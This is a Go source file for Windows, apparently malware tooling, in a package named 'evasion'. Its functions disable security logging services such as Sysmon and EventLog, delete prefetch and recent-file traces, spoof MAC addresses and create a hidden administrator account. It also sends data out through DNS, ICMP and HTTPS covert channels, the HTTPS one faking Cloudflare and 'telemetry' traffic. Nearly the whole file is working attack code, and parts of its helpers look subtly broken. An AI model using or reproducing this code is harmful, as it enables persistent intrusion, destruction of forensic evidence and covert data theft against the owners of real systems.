//go:build windows

package evasion

import (
	"encoding/binary"
	"fmt"
	"net"
	"os/exec"
	"time"
	"unsafe"

	"crypto/tls"
)

// NetworkEvasion provides techniques to evade network-based detection (IDS/IPS, firewalls).
type NetworkEvasion struct{}

// DisableLogging disables Windows security logging services.
func DisableLogging() error {
	services := []string{
		"Sysmon",
		"WinRM",
		"Wecsvc",       // Windows Event Collector
		"EventLog",     // Windows Event Log
	}

	for _, svc := range services {
		exec.Command("sc", "query", svc).Run()
		exec.Command("sc", "config", svc, "start=disabled").Run()
		exec.Command("sc", "stop", svc).Run()
	}

	return nil
}

// ClearPrefetch clears prefetch files to remove execution traces.
func ClearPrefetch() error {
	cmd := exec.Command("cmd", "/c", "del /q /f C:\\Windows\\Prefetch\\*")
	return cmd.Run()
}

// ClearRecentFiles clears recent file access history.
func ClearRecentFiles() error {
	exec.Command("cmd", "/c", "del /q /f %USERPROFILE%\\Recent\\*").Run()
	exec.Command("cmd", "/c", "del /q /f %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*").Run()
	return nil
}

// SpoofMACAddress changes the MAC address of a network interface.
func SpoofMACAddress(interfaceName, newMAC string) error {
	cmd := exec.Command("netsh", "interface", "set", "interface",
		fmt.Sprintf("name=%s", interfaceName),
		fmt.Sprintf("newmac=%s", newMAC))
	return cmd.Run()
}

// CreateHiddenUser creates a hidden Windows user account.
func CreateHiddenUser(username, password string) error {
	// Create user
	exec.Command("net", "user", username, password, "/add").Run()

	// Add to administrators group
	exec.Command("net", "localgroup", "administrators", username, "/add").Run()

	// Hide user from login screen
	regCmd := fmt.Sprintf(`reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %s /t REG_DWORD /d 0 /f`, username)
	exec.Command("cmd", "/c", regCmd).Run()

	return nil
}

// DNSTunnel creates a DNS tunnel for covert communication.
func DNSTunnel(dnsServer, domain string, data []byte) error {
	// Encode data as subdomain labels
	encoded := encodeDNSTunnelData(data)

	// Split into chunks of 63 chars (DNS label limit)
	chunks := splitChunks(encoded, 63)

	for _, chunk := range chunks {
		fqdn := fmt.Sprintf("%s.%s", chunk, domain)

		// Perform DNS query
		var r resolver
		_, err := r.lookupTXT(fqdn, dnsServer)
		if err != nil {
			continue
		}

		time.Sleep(100 * time.Millisecond)
	}

	return nil
}

// ICMPTunnel sends data via ICMP echo requests (ping).
func ICMPTunnel(target string, data []byte) error {
	conn, err := net.Dial("ip4:icmp", target)
	if err != nil {
		return err
	}
	defer conn.Close()

	// Build ICMP echo request with data in payload
	msg := buildICMPEcho(data)
	_, err = conn.Write(msg)

	return err
}

// HTTPSCovertChannel sends data via HTTPS to a legitimate-looking endpoint.
func HTTPSCovertChannel(url string, data []byte) error {
	// Use TLS to look like regular HTTPS traffic
	conn, err := tls.Dial("tcp", url, &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         "cdn.cloudflare.com",
	})
	if err != nil {
		return err
	}
	defer conn.Close()

	// Send data as HTTP POST
	request := fmt.Sprintf("POST /api/v1/telemetry HTTP/1.1\r\n"+
		"Host: %s\r\n"+
		"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"+
		"Content-Type: application/octet-stream\r\n"+
		"Content-Length: %d\r\n\r\n", url, len(data))

	conn.Write([]byte(request))
	conn.Write(data)

	return nil
}

// --- Internal helpers ---

type resolver struct{}

func (r *resolver) lookupTXT(name, server string) ([]string, error) {
	// Use Windows DNS API via net package
	return net.LookupTXT(name)
}

func encodeDNSTunnelData(data []byte) string {
	// Base32 encode and remove padding
	const base32Chars = "abcdefghijklmnopqrstuvwxyz234567"
	result := make([]byte, 0, len(data)*8/5)

	for i := 0; i < len(data); i += 5 {
		var chunk uint64
		n := minInt(len(data)-i, 5)
		for j := 0; j < n; j++ {
			chunk = (chunk << 8) | uint64(data[i+j])
		}
		chunk <<= uint(8 * (5 - n))

		for j := 4; j >= 0; j-- {
			if i+j < len(data) {
				idx := (chunk >> uint(j*5)) & 0x1F
				result = append(result, base32Chars[idx])
			}
		}
	}

	return string(result)
}

func splitChunks(s string, size int) []string {
	var chunks []string
	for i := 0; i < len(s); i += size {
		end := i + size
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}

func buildICMPEcho(data []byte) []byte {
	// ICMP Echo Request: Type=8, Code=0
	msg := make([]byte, 8+len(data))
	msg[0] = 8  // Echo Request
	msg[1] = 0  // Code
	msg[2] = 0  // Checksum (calculated below)
	msg[3] = 0  // Checksum
	binary.BigEndian.PutUint16(msg[4:6], 1) // Identifier
	binary.BigEndian.PutUint16(msg[6:8], 1) // Sequence

	copy(msg[8:], data)

	// Calculate checksum
	var sum uint32
	for i := 0; i < len(msg); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(msg[i:]))
	}
	for sum > 0xFFFF {
		sum = (sum >> 16) + (sum & 0xFFFF)
	}
	binary.BigEndian.PutUint16(msg[2:4], ^uint16(sum))

	return msg
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// Ensure imports are used
var _ = unsafe.Pointer(nil)
var _ = time.Second
